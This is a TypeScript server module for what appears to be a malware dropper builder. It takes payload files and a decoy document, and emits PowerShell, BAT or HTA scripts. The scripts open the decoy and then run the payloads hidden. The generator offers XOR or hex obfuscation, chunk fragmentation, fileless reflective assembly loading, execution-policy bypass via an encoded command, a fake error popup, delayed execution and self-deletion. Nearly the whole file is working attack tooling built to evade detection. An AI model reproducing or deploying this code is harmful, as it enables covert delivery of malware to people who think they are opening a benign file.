
'use server';

import { z } from 'zod';

const FileInputSchema = z.object({
  name: z.string(),
  content: z.string(), // Base64 Data URI
});

const MergePayloadsInputSchema = z.object({
  payloads: z.array(FileInputSchema),
  benign: FileInputSchema,
  outputFormat: z.enum(['ps1', 'bat', 'hta']),
  obfuscationType: z.enum(['none', 'xor', 'hex']).default('none'),
  encryptionKey: z.string().optional(),
  useFragmentation: z.boolean().optional(),
  executionDelay: z.string().optional(),
  fileless: z.boolean().optional(),
  fakeErrorMessage: z.string().optional(),
  selfDestruct: z.boolean().optional(),
});

type MergePayloadsInput = z.infer<typeof MergePayloadsInputSchema>;

type MergePayloadsOutput = {
  success: boolean;
  scriptContent?: string;
  error?: string;
};

// Helper function to decode a data URI to a Base64 string
function decodeDataUri(dataUri: string): string {
    const parts = dataUri.split(',');
    if (parts.length !== 2) {
        throw new Error('Invalid Data URI format');
    }
    return parts[1];
}

// XOR Encryption function
function xorEncrypt(data: string, key: string): string {
    let result = '';
    for (let i = 0; i < data.length; i++) {
        result += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return result;
}

const generatePowershellDropper = (
    payloads: { name: string, content: string }[], 
    benignName: string, 
    benignBase64: string, 
    obfuscationType: MergePayloadsInput['obfuscationType'], 
    encryptionKey?: string, 
    useFragmentation?: boolean,
    executionDelay?: string,
    fileless?: boolean,
    fakeErrorMessage?: string,
    selfDestruct?: boolean
): string => {
    
    let delaySection = '';
    if (executionDelay && !isNaN(parseInt(executionDelay, 10))) {
        delaySection = `Start-Sleep -Seconds ${parseInt(executionDelay, 10)}`;
    }

    let fakeErrorSection = '';
    if (fakeErrorMessage) {
        fakeErrorSection = `
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show("${fakeErrorMessage}", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
        `;
    }
    
    let selfDestructSection = '';
    if (selfDestruct) {
        selfDestructSection = `
try {
    Remove-Item -Path $MyInvocation.MyCommand.Path -ErrorAction SilentlyContinue
} catch {}
        `;
    }

    const payloadProcessingLoops = payloads.map((payload, index) => {
        const varSuffix = index + 1;
        let payloadSection: string;
        let payloadDecoding: string;

        if (useFragmentation) {
            const chunkSize = 1000;
            const chunks = [];
            for (let i = 0; i < payload.content.length; i += chunkSize) {
                chunks.push(payload.content.substring(i, i + chunkSize));
            }
            const chunkString = chunks.map(c => `@"${c}"@`).join(',');
            payloadSection = `$payloadChunks${varSuffix} = ${chunkString}\n$payloadData${varSuffix} = $payloadChunks${varSuffix} -join ''`;
        } else {
            payloadSection = `$payloadData${varSuffix} = @"\n${payload.content}\n"@`;
        }

        if (obfuscationType === 'xor' && encryptionKey) {
            payloadDecoding = `
$key = "${encryptionKey}"
$encryptedBytes${varSuffix} = [System.Convert]::FromBase64String($payloadData${varSuffix})
$keyBytes = [System.Text.Encoding]::ASCII.GetBytes($key)
$payloadFileBytes${varSuffix} = New-Object byte[] $encryptedBytes${varSuffix}.Length
for ($i = 0; $i -lt $encryptedBytes${varSuffix}.Length; $i++) {
    $payloadFileBytes${varSuffix}[$i] = $encryptedBytes${varSuffix}[$i] -bxor $keyBytes[$i % $keyBytes.Length]
}`;
        } else if (obfuscationType === 'hex') {
            payloadDecoding = `
$hexString${varSuffix} = $payloadData${varSuffix} -replace '[\\s\\r\\n]'
$payloadFileBytes${varSuffix} = New-Object byte[] ($hexString${varSuffix}.Length / 2)
for ($i = 0; $i -lt $hexString${varSuffix}.Length; $i += 2) {
    $payloadFileBytes${varSuffix}[$i/2] = [System.Convert]::ToByte($hexString${varSuffix}.Substring($i, 2), 16)
}`;
        } else { // 'none' or default to Base64
            payloadDecoding = `\n$payloadFileBytes${varSuffix} = [System.Convert]::FromBase64String($payloadData${varSuffix})`;
        }
        
        let executionSection: string;
        if (fileless) {
            executionSection = `
try {
    $assembly = [System.Reflection.Assembly]::Load($payloadFileBytes${varSuffix})
    $entryPoint = $assembly.EntryPoint
    if ($entryPoint) {
        $entryPoint.Invoke($null, $null)
    } else {
        $payloadFilePath${varSuffix} = Join-Path $tempPath "${payload.name}"
        [IO.File]::WriteAllBytes($payloadFilePath${varSuffix}, $payloadFileBytes${varSuffix})
        Start-Process -FilePath $payloadFilePath${varSuffix} -WindowStyle Hidden
    }
} catch {
    $payloadFilePath${varSuffix} = Join-Path $tempPath "${payload.name}"
    [IO.File]::WriteAllBytes($payloadFilePath${varSuffix}, $payloadFileBytes${varSuffix})
    Start-Process -FilePath $payloadFilePath${varSuffix} -WindowStyle Hidden
}`;
        } else {
            executionSection = `
$payloadFilePath${varSuffix} = Join-Path $tempPath "${payload.name}"
[IO.File]::WriteAllBytes($payloadFilePath${varSuffix}, $payloadFileBytes${varSuffix})
Start-Process -FilePath $payloadFilePath${varSuffix} -WindowStyle Hidden`;
        }

        return `
# Processing Payload ${varSuffix}: ${payload.name}
${payloadSection}
${payloadDecoding}
${executionSection}
`;
    }).join('\n');

    return `
$tempPath = $env:TEMP
$benignFilePath = Join-Path $tempPath "${benignName}"

try {
    $benignFileBase64 = @"
${benignBase64}
"@
    
    [IO.File]::WriteAllBytes($benignFilePath, [System.Convert]::FromBase64String($benignFileBase64))
    Start-Process $benignFilePath

    ${fakeErrorSection}

    ${delaySection}

    ${payloadProcessingLoops}
} catch {
    # Fail silently
} finally {
    ${selfDestructSection}
}
`;
};


/**
 * Generates a dropper script that embeds multiple files.
 * When run, it drops the benign file, opens it, and executes the payloads.
 */
export async function mergePayloads(input: MergePayloadsInput): Promise<MergePayloadsOutput> {
  try {
    const validatedInput = MergePayloadsInputSchema.parse(input);
    const { payloads, benign, outputFormat, obfuscationType, encryptionKey, useFragmentation, executionDelay, fileless, fakeErrorMessage, selfDestruct } = validatedInput;

    const processedPayloads = payloads.map(payload => {
        let payloadBase64 = decodeDataUri(payload.content);
        let payloadString = payloadBase64; // Default to base64

        if (obfuscationType === 'xor' && encryptionKey) {
            const rawPayload = Buffer.from(payloadBase64, 'base64');
            const encryptedPayload = Buffer.from(xorEncrypt(rawPayload.toString('latin1'), encryptionKey), 'latin1');
            payloadString = encryptedPayload.toString('base64');
        } else if (obfuscationType === 'hex') {
            payloadString = Buffer.from(payloadBase64, 'base64').toString('hex');
        }
        
        return { name: payload.name, content: payloadString };
    });
    
    const benignBase64 = decodeDataUri(benign.content);
    let scriptContent = '';

    switch (outputFormat) {
        case 'ps1':
            scriptContent = generatePowershellDropper(processedPayloads, benign.name, benignBase64, obfuscationType, encryptionKey, useFragmentation, executionDelay, fileless, fakeErrorMessage, selfDestruct);
            break;
        
        case 'bat':
            const psScript = generatePowershellDropper(processedPayloads, benign.name, benignBase64, obfuscationType, encryptionKey, useFragmentation, executionDelay, fileless, fakeErrorMessage, selfDestruct);
            const encodedPsScript = Buffer.from(psScript, 'utf16le').toString('base64');
            let batContent = `@echo off\npowershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${encodedPsScript}`;
            if(selfDestruct) {
                batContent += `\n(goto) 2>nul & del "%~f0"`;
            }
            scriptContent = batContent;
            break;

        case 'hta':
            const payloadProcessingVbs = processedPayloads.map((payload, index) => {
                const varSuffix = index + 1;
                let payloadProcessingSection: string;

                if (useFragmentation) {
                    const chunkSize = 500;
                    const chunks = [];
                    for (let i = 0; i < payload.content.length; i += chunkSize) {
                        chunks.push(payload.content.substring(i, i + chunkSize));
                    }
                    const chunkString = chunks.map(c => `"${c}"`).join(" & ");
                    payloadProcessingSection = `payloadData${varSuffix} = ${chunkString}`;
                } else {
                    payloadProcessingSection = `payloadData${varSuffix} = "${payload.content}"`;
                }

                if (obfuscationType === 'xor' && encryptionKey) {
                    payloadProcessingSection += `
                    key = "${encryptionKey}"
                    
                    ' Decrypt the payload
                    Dim encryptedBytes, keyBytes, i
                    Set oXML = CreateObject("MSXML2.DOMDocument")
                    Set oNode = oXML.CreateElement("base64")
                    oNode.DataType = "bin.base64"
                    oNode.Text = payloadData${varSuffix}
                    encryptedBytes = oNode.NodeTypedValue
                    
                    keyBytes = StrToBytes(key)
                    
                    For i = 0 To UBound(encryptedBytes)
                        encryptedBytes(i) = encryptedBytes(i) Xor keyBytes(i Mod UBound(keyBytes))
                    Next
                    
                    ' Write decrypted bytes to file
                    With CreateObject("ADODB.Stream")
                        .Type = 1 ' adTypeBinary
                        .Open
                        .Write encryptedBytes
                        .SaveToFile tempPath & "\\${payload.name}", 2 ' adSaveCreateOverWrite
                        .Close
                    End With
                    `;
                } else if (obfuscationType === 'hex') {
                     payloadProcessingSection += `Call HexToFile(payloadData${varSuffix}, tempPath & "\\${payload.name}")`;
                } else { // none (base64)
                     payloadProcessingSection += `Call Base64ToFile(payloadData${varSuffix}, tempPath & "\\${payload.name}")`;
                }
                
                return `
                ' Payload ${varSuffix}: ${payload.name}
                ${payloadProcessingSection}
                objShell.Run "cmd /c """ & tempPath & "\\${payload.name}" & """", 0, False
                `;
            }).join('\n');
            
            let selfDestructHta = '';
            if (selfDestruct) {
                selfDestructHta = `
                On Error Resume Next
                objFSO.DeleteFile(window.document.location.pathname)
                On Error GoTo 0
                `;
            }

            const vbsPayload = `
                Set objShell = CreateObject("WScript.Shell")
                Set objFSO = CreateObject("Scripting.FileSystemObject")
                
                tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
                benignFilePath = tempPath & "\\${benign.name}"

                benignB64 = "${benignBase64}"
                Call Base64ToFile(benignB64, benignFilePath)
                objShell.Run "cmd /c """ & benignFilePath & """", 0, True

                ${fakeErrorMessage ? `MsgBox "${fakeErrorMessage}", 16, "Error"` : ''}

                ${executionDelay ? `WScript.Sleep ${parseInt(executionDelay, 10) * 1000}` : ''}
                
                ${payloadProcessingVbs}
                
                ${selfDestructHta}

                ' Close the HTA window
                window.close()

                Sub HexToFile(sHex, sFile)
                    Dim aHex, i, s, oS
                    sHex = Replace(sHex, " ", "")
                    aHex = Split(Mid(sHex, 1, Len(sHex) - (Len(sHex) Mod 2)), " ")
                    Set oS = CreateObject("ADODB.Stream")
                    oS.Type = 1
                    oS.Open
                    For i = 0 to UBound(aHex)
                      s = Mid(sHex, (i*2)+1, 2)
                      If Len(s) > 0 Then oS.WriteText Chr(CByte("&H" & s))
                    Next
                    oS.SaveToFile sFile, 2
                    oS.Close
                End Sub

                Sub Base64ToFile(B64, FileName)
                    Dim oXML, oNode
                    Set oXML = CreateObject("MSXML2.DOMDocument")
                    Set oNode = oXML.CreateElement("base64")
                    oNode.DataType = "bin.base64"
                    oNode.Text = B64
                    With CreateObject("ADODB.Stream")
                        .Type = 1 ' adTypeBinary
                        .Open
                        .Write oNode.NodeTypedValue
                        .SaveToFile FileName, 2 ' adSaveCreateOverWrite
                        .Close
                    End With
                End Sub

                Function StrToBytes(s)
                    Dim bytes(), i
                    ReDim bytes(Len(s) - 1)
                    For i = 1 To Len(s)
                        bytes(i-1) = Asc(Mid(s, i, 1))
                    Next
                    StrToBytes = bytes
                End Function
            `;
            scriptContent = `<script language="VBScript">${vbsPayload}</script>`;
            break;

        default:
             return { success: false, error: 'Invalid or unsupported output format.' };
    }

    return {
      success: true,
      scriptContent: scriptContent,
    };
  } catch (e) {
    console.error("Payload merging failed:", e);
    const message = e instanceof Error ? e.message : 'An unknown error occurred.';
    return {
      success: false,
      error: `Failed to generate dropper script: ${message}`,
    };
  }
}
